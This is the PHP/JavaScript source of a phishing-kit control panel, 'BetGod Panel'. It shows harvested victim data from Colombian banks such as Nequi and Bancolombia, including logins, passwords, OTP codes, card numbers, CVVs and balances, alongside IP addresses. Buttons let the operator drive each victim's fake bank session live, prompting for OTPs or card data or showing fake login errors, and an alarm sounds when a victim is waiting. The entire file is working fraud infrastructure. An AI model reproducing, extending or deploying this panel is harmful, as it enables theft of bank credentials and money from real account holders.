<?php
// god/dashboard.php
require_once __DIR__ . '/auth.php';
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard Admin</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary: #1e1e1e;
            --accent: #00ff88;
            --bg: #121212;
            --card-bg: #1e1e1e;
            --text: #e0e0e0;
            --text-muted: #a0a0a0;
            --border: #333;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            padding-bottom: 50px;
        }

        .navbar {
            background-color: #000;
            border-bottom: 2px solid var(--accent);
            padding: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.2);
        }

        .navbar h1 {
            margin: 0;
            font-size: 1.25rem;
            font-weight: 700;
            color: var(--accent);
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .status-dot {
            height: 10px;
            width: 10px;
            border-radius: 50%;
            display: inline-block;
            background: var(--accent);
            margin-right: 5px;
            box-shadow: 0 0 8px var(--accent);
        }

        .disconnected {
            background: #ef4444;
            box-shadow: 0 0 8px #ef4444;
        }

        .tabs {
            display: flex;
            gap: 10px;
            padding: 1rem;
            max-width: 1200px;
            margin: 0 auto;
            justify-content: center;
        }

        .tab {
            padding: 8px 20px;
            border-radius: 20px;
            border: 1px solid var(--border);
            background: #252525;
            color: var(--text);
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: 500;
            transition: all 0.2s;
        }

        .tab:hover {
            border-color: var(--accent);
            color: var(--accent);
        }

        .tab.active {
            background: var(--accent);
            color: #000;
            border-color: var(--accent);
            font-weight: 800;
            box-shadow: 0 0 10px rgba(0, 255, 136, 0.4);
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 1rem;
            padding: 1rem;
            max-width: 1200px;
            margin: 0 auto;
        }

        .card {
            background: var(--card-bg);
            border-radius: 12px;
            border: 1px solid var(--border);
            padding: 1rem;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5);
            display: flex;
            flex-direction: column;
            gap: 0.75rem;
            transition: transform 0.2s;
        }

        .card:hover {
            border-color: #555;
            transform: translateY(-2px);
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid var(--border);
            padding-bottom: 0.75rem;
        }

        .bank-badge {
            background: #252525;
            padding: 4px 10px;
            border-radius: 6px;
            font-size: 0.75rem;
            font-weight: 700;
            color: var(--text-muted);
            text-transform: uppercase;
            border: 1px solid #333;
        }

        .bank-nequi {
            color: #ff00bf;
            border-color: #ff00bf;
            background: rgba(255, 0, 191, 0.1);
        }

        .bank-banco {
            color: #ffe600;
            border-color: #ffe600;
            background: rgba(255, 230, 0, 0.1);
        }

        .time {
            font-size: 0.75rem;
            color: #666;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            font-size: 0.9rem;
        }

        .info-label {
            color: var(--text-muted);
        }

        .info-val {
            font-weight: 600;
            color: #fff;
        }

        .status-pill {
            text-align: center;
            padding: 6px;
            border-radius: 6px;
            font-size: 0.8rem;
            font-weight: 700;
            border: 1px solid transparent;
        }

        .st-waiting {
            background: rgba(60, 180, 229, 0.15);
            color: #3cb4e5;
            border-color: rgba(60, 180, 229, 0.3);
        }

        .st-error {
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
            border-color: rgba(239, 68, 68, 0.3);
        }

        .st-success {
            background: rgba(34, 197, 94, 0.15);
            color: #22c55e;
            border-color: rgba(34, 197, 94, 0.3);
        }

        .st-warn {
            background: rgba(234, 179, 8, 0.15);
            color: #eab308;
            border-color: rgba(234, 179, 8, 0.3);
        }

        .st-done {
            background: rgba(148, 163, 184, 0.1);
            color: #94a3b8;
            border-color: #444;
        }

        .actions {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.5rem;
            margin-top: 0.5rem;
        }

        .btn {
            border: none;
            padding: 10px;
            border-radius: 6px;
            font-size: 0.85rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            color: #000;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .btn:active {
            transform: scale(0.96);
        }

        .btn-err {
            background: #ef4444;
            color: #fff;
            font-weight: 700;
        }

        .btn-otp {
            background: #3cb4e5;
            color: #000;
            font-weight: 700;
        }

        .btn-cc {
            background: #d946ef;
            color: #fff;
            font-weight: 700;
        }

        .btn-fin {
            background: #262626;
            color: #aaa;
            grid-column: span 2;
            border: 1px solid #444;
        }

        .btn-data {
            background: #22c55e;
            color: #000;
            font-weight: 800;
        }

        .btn:hover {
            opacity: 0.9;
            filter: brightness(1.1);
        }

        .btn-delete {
            position: absolute;
            bottom: 10px;
            right: 10px;
            background: transparent;
            border: none;
            color: #444;
            cursor: pointer;
            font-size: 1rem;
            transition: color 0.2s;
            top: auto;
            /* Override top */
        }

        .btn-delete:hover {
            color: #ef4444;
        }

        .card {
            position: relative;
        }

        @keyframes blink {
            0% {
                border-color: #ef4444;
                box-shadow: 0 0 10px #ef4444;
                background: rgba(239, 68, 68, 0.1);
            }

            50% {
                border-color: transparent;
                box-shadow: none;
                background: var(--card-bg);
            }

            100% {
                border-color: #ef4444;
                box-shadow: 0 0 10px #ef4444;
                background: rgba(239, 68, 68, 0.1);
            }
        }

        .blink-anim {
            animation: blink 1s infinite;
        }
    </style>
</head>

<body>
    <!-- Generic Notification Sound (Short Beep) -->
    <audio id="notif-sound" loop>
        <source
            src="data:audio/mp3;base64,//uQRAAAAWMSLwUIYAAsYkXgoQwAEaYLWfkWgAI0wWs/ItAAAG1xUAALDkAAXG1iAAQA//uQRAAAAWMSLwUIYAAsYkXgoQwAEaYLWfkWgAI0wWs/ItAAAG1xUAALDkAAXG1iAAQA//uQRAAAAWMSLwUIYAAsYkXgoQwAEaYLWfkWgAI0wWs/ItAAAG1xUAALDkAAXG1iAAQA//uQRAAAAWMSLwUIYAAsYkXgoQwAEaYLWfkWgAI0wWs/ItAAAG1xUAALDkAAXG1iAAQA//uQRAAAAWMSLwUIYAAsYkXgoQwAEaYLWfkWgAI0wWs/ItAAAG1xUAALDkAAXG1iAAQA//uQRAAAAWMSLwUIYAAsYkXgoQwAEaYLWfkWgAI0wWs/ItAAAG1xUAALDkAAXG1iAAQA"
            type="audio/mpeg">
    </audio>
    <!-- Actual Generic Beep (Small, clean) -->
    <audio id="alert-beep" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" loop></audio>

    <nav class="navbar">
        <div style="display:flex; align-items:center;">
            <div id="status-dot" class="status-dot"></div>
            <h1>BetGod Panel</h1>
        </div>
        <a href="logout.php" style="color: var(--text-muted); text-decoration:none; font-size: 1.2rem;"><i
                class="fas fa-sign-out-alt"></i></a>
    </nav>

    <div class="tabs" style="flex-wrap: wrap; justify-content:space-between; align-items:center;">
        <div style="display:flex; gap:10px; align-items:center;">
            <label for="bankFilter" style="color:#aaa; font-weight:600;">Filtrar banco:</label>
            <select id="bankFilter" onchange="setFilter(this.value)"
                style="padding:8px 15px; border-radius:8px; background:#252525; color:#fff; border:1px solid #444; font-size:1rem; outline:none;">
                <option value="all">Todos</option>
                <option value="nequi">Nequi</option>
                <option value="bancolombia">Bancolombia</option>
                <option value="davivienda">Davivienda</option>
                <option value="bbva">BBVA</option>
                <option value="bogota">Bogotá</option>
                <option value="avvillas">Av Villas</option>
                <option value="occidente">Occidente</option>
                <option value="caja social">Caja Social</option>
                <option value="cajavillas">Caja Villas</option>
                <option value="gnb sudameris">GNB Sudameris</option>
                <option value="popular">Banco Popular</option>
                <option value="scotiabank">Colpatria</option>
                <option value="pse_otros">Otros PSE</option>
            </select>
        </div>

        <button onclick="openBlockedModal()"
            style="padding:8px 15px; border-radius:8px; background:#ef4444; color:#fff; border:none; cursor:pointer; font-weight:bold;">
            <i class="fas fa-ban"></i> IPs Bloqueadas
        </button>
    </div>

    <!-- Modal Blocked IPs -->
    <div id="blockedModal"
        style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; align-items:center; justify-content:center;">
        <div
            style="background:#1e1e1e; padding:20px; border-radius:10px; width:90%; max-width:500px; max-height:80vh; overflow-y:auto; border:1px solid #333;">
            <div
                style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; border-bottom:1px solid #333; padding-bottom:10px;">
                <h3 style="margin:0; color:#ef4444;"><i class="fas fa-ban"></i> IPs Bloqueadas</h3>
                <button onclick="document.getElementById('blockedModal').style.display='none'"
                    style="background:none; border:none; color:#aaa; font-size:1.5rem; cursor:pointer;">&times;</button>
            </div>

            <div id="blockedList" style="display:flex; flex-direction:column; gap:10px;">
                <!-- Items injected here -->
                <p style="color:#666; text-align:center;">Cargando...</p>
            </div>
        </div>
    </div>

    <div id="grid" class="grid">
        <!-- Cards injected via JS -->
    </div>

    <script>
        let currentFilter = 'all';
        let isUpdating = false;

        function setFilter(type) {
            currentFilter = type;
            // No need to toggle active class on tabs anymore
            updateData();
        }

        async function openBlockedModal() {
            const modal = document.getElementById('blockedModal');
            const list = document.getElementById('blockedList');
            modal.style.display = 'flex';
            list.innerHTML = '<p style="color:#666; text-align:center;">Cargando...</p>';

            try {
                const res = await fetch('api.php?action=get_blocked');
                const json = await res.json();

                if (json.status === 'success' && json.data.length > 0) {
                    list.innerHTML = '';
                    json.data.forEach(ip => {
                        const item = document.createElement('div');
                        item.style.cssText = 'background:#252525; padding:10px; border-radius:6px; display:flex; justify-content:space-between; align-items:center; border:1px solid #333;';
                        item.innerHTML = `
                            <span style="font-family:monospace; color:#ccc;">${ip}</span>
                            <button onclick="unblockIp('${ip}')" style="background:#22c55e; border:none; color:#000; padding:4px 10px; border-radius:4px; cursor:pointer; font-weight:bold; font-size:0.8rem;">
                                Desbloquear
                            </button>
                        `;
                        list.appendChild(item);
                    });
                } else {
                    list.innerHTML = '<p style="color:#aaa; text-align:center;">No hay IPs bloqueadas.</p>';
                }
            } catch (e) {
                list.innerHTML = '<p style="color:#ef4444; text-align:center;">Error al cargar.</p>';
            }
        }

        async function unblockIp(ip) {
            if (!confirm('¿Desbloquear ' + ip + '?')) return;
            try {
                await fetch('actions.php?action=unblock_ip&ip=' + ip);
                openBlockedModal(); // Refresh list
            } catch (e) { alert('Error'); }
        }

        async function updateData() {
            if (isUpdating) return;
            isUpdating = true;

            try {
                const res = await fetch('api.php');
                const json = await res.json();

                if (json.status === 'success') {
                    renderCards(json.data);
                    document.getElementById('status-dot').classList.remove('disconnected');
                }
            } catch (e) {
                console.error(e);
                document.getElementById('status-dot').classList.add('disconnected');
            } finally {
                isUpdating = false;
            }
        }

        function renderCards(data) {
            const grid = document.getElementById('grid');
            grid.innerHTML = '';

            data.forEach(item => {
                if (currentFilter !== 'all') {
                    if (currentFilter === 'nequi' && item.type !== 'nequi') return;
                    if (currentFilter === 'pse_otros' && item.type === 'nequi') return; // Show all non-nequi (pse) basically, or refine

                    if (currentFilter !== 'nequi' && currentFilter !== 'pse_otros') {
                        // Filter by specific bank name (case insensitive check)
                        const bankName = item.bank.toLowerCase();
                        if (!bankName.includes(currentFilter)) return;
                    }
                }

                const isNequi = item.type === 'nequi';
                const bankClass = isNequi ? 'bank-nequi' : 'bank-banco';

                // Color mapping logic for status pill
                let stClass = 'st-waiting';
                if ([2, 4, 6].includes(parseInt(item.status_id))) stClass = 'st-error'; // Errors usually 2,4,6
                if (parseInt(item.status_id) === 0 || parseInt(item.status_id) === 7) stClass = 'st-done';
                if (parseInt(item.status_id) === 6 && isNequi) stClass = 'st-success'; // Datos success

                const card = document.createElement('div');
                card.className = 'card';
                card.innerHTML = `
                    <div class="card-header">
                        <span class="bank-badge ${bankClass}">${item.bank}</span>
                        <span class="time">${item.date ? item.date.substring(11, 16) : ''}</span>
                    </div>

                    <div class="info-row">
                        <span class="info-label">Usuario:</span>
                        <span class="info-val">${item.user ? item.user : '<i style="color:#444">Esperando...</i>'}</span>
                    </div>
                    ${item.email ? `
                    <div class="info-row">
                        <span class="info-label">Email:</span>
                        <span class="info-val" style="font-size:0.8rem; color:#aaa">${item.email}</span>
                    </div>` : ''}
                    
                    <div class="info-row">
                        <span class="info-label">Clave:</span>
                        <span class="info-val" style="letter-spacing:1px">${item.pass ? item.pass : '...'}</span>
                    </div>

                    ${item.saldo ? `
                    <div class="info-row">
                        <span class="info-label">Saldo:</span>
                        <span class="info-val" style="color:#4ade80;">$ ${item.saldo}</span>
                    </div>` : ''}
                    
                    ${item.otp ? `
                    <div class="info-row" style="background:rgba(234, 88, 12, 0.2); padding:6px; border-radius:4px; border:1px solid rgba(234, 88, 12, 0.4);">
                        <span class="info-label" style="color:#fdba74">OTP:</span>
                        <span class="info-val" style="color:#fdba74; letter-spacing:1px; font-size:1.1rem">${item.otp}</span>
                    </div>` : ''}

                    ${item.tarjeta ? `
                    <div class="info-row" style="background:rgba(217, 70, 239, 0.15); padding:6px; border-radius:4px; border:1px solid rgba(217, 70, 239, 0.3); flex-direction:column; gap:4px; margin-top:5px;">
                        <span class="info-label" style="color:#e879f9; font-size:0.75rem">DATOS TARJETA:</span>
                        <div style="display:flex; justify-content:space-between;">
                            <span class="info-val" style="color:#f0abfc; letter-spacing:1px">${item.tarjeta}</span>
                            <span class="info-val" style="color:#f0abfc">${item.cvv}</span>
                        </div>
                        <span class="info-val" style="color:#f0abfc; font-size:0.8rem; text-align:right">Vence: ${item.fecha}</span>
                    </div>` : ''}

                    <div class="status-pill ${stClass}">
                        ${item.status_text}
                    </div>

                    <div class="actions">
                        ${getButtons(item)}
                    </div>
                    
                    <div style="margin-top: 8px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 8px; display:flex; justify-content:space-between; align-items:center;">
                        <span style="font-size: 0.75rem; color: #666; font-family:monospace">IP: ${item.ip || 'Unknown'}</span>
                        <div style="display:flex; gap:5px; align-items:center;">
                            <button class="btn" style="background:transparent; border:1px solid #ef4444; color:#ef4444; font-size:0.7rem; padding:2px 6px; border-radius:4px; cursor:pointer;" onclick="blockIp('${item.ip}')" title="Bloquear IP">
                                <i class="fas fa-ban"></i> Block
                            </button>
                            <button class="btn-delete-static" onclick="deleteItem(${item.id}, '${item.type}')" title="Eliminar" style="background:transparent; border:none; color:#ef4444; cursor:pointer; font-size:1rem; padding:0 5px;">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>
                    </div>
                `;
                // Add blinking class if status is 1 (Action Required)
                const isWaiting = parseInt(item.status_id) === 1;
                if (isWaiting) {
                    card.classList.add('blink-anim');
                }

                grid.appendChild(card);
            });

            // Sound Logic
            const hasWaiting = data.some(item => parseInt(item.status_id) === 1);
            const audio = document.getElementById('alert-beep');

            if (hasWaiting) {
                // Play sound if not already playing
                if (audio.paused) {
                    audio.play().catch(e => console.log("Audio play blocked (interaction needed)"));
                }
            } else {
                audio.pause();
                audio.currentTime = 0;
            }
        }

        function getButtons(item) {
            let btns = '';
            const id = item.id;
            const type = item.type; // 'nequi' or 'pse'
            // ... (rest of code)

            if (type === 'nequi') {
                btns += `<button class="btn btn-err" onclick="act(${id},'nequi',2)">Err Login</button>`;
                btns += `<button class="btn btn-otp" onclick="act(${id},'nequi',3)">Pedir OTP</button>`;
                btns += `<button class="btn btn-err" onclick="act(${id},'nequi',4)">Err OTP</button>`;
                btns += `<button class="btn btn-data" onclick="act(${id},'nequi',6)">Datos</button>`;
                btns += `<button class="btn btn-fin" onclick="act(${id},'nequi',0)">Finalizar</button>`;
            } else {
                btns += `<button class="btn btn-err" onclick="act(${id},'pse',2)">Err Login</button>`;
                btns += `<button class="btn btn-otp" onclick="act(${id},'pse',3)">Pedir OTP</button>`;
                btns += `<button class="btn btn-err" onclick="act(${id},'pse',4)">Err OTP</button>`;
                btns += `<button class="btn btn-cc" onclick="act(${id},'pse',5)">Pedir CC</button>`;
                btns += `<button class="btn btn-fin" onclick="act(${id},'pse',7)">Finalizar</button>`;
            }
            return btns;
        }

        async function act(id, table, state) {
            const btn = event.target;
            btn.style.opacity = '0.5';

            try {
                await fetch(`actions.php?id=${id}&table=${table}&estado=${state}`);
                setTimeout(updateData, 200); // Quick refresh
            } catch (e) {
                alert('Error de conexión');
            } finally {
                btn.style.opacity = '1';
            }
        }

        async function deleteItem(id, table) {
            if (!confirm('¿Estás seguro de eliminar este registro?')) return;
            try {
                const res = await fetch(`actions.php?id=${id}&table=${table}&estado=0&action=delete`); // estado is dummy here
                const json = await res.json();
                if (json.status === 'success') {
                    updateData();
                } else {
                    alert('Error al eliminar');
                }
            } catch (e) {
                console.error(e);
                alert('Error de conexión al eliminar');
            }
        }

        async function blockIp(ip) {
            if (!ip || ip === 'Unknown') { alert('No IP detected'); return; }
            if (!confirm('¿Bloquear IP: ' + ip + '?')) return;
            try {
                await fetch('actions.php?action=block_ip&ip=' + ip);
                alert('IP Bloqueada');
            } catch (e) { alert('Error'); }
        }

        setInterval(updateData, 2000);
        updateData();
    </script>
</body>

</html>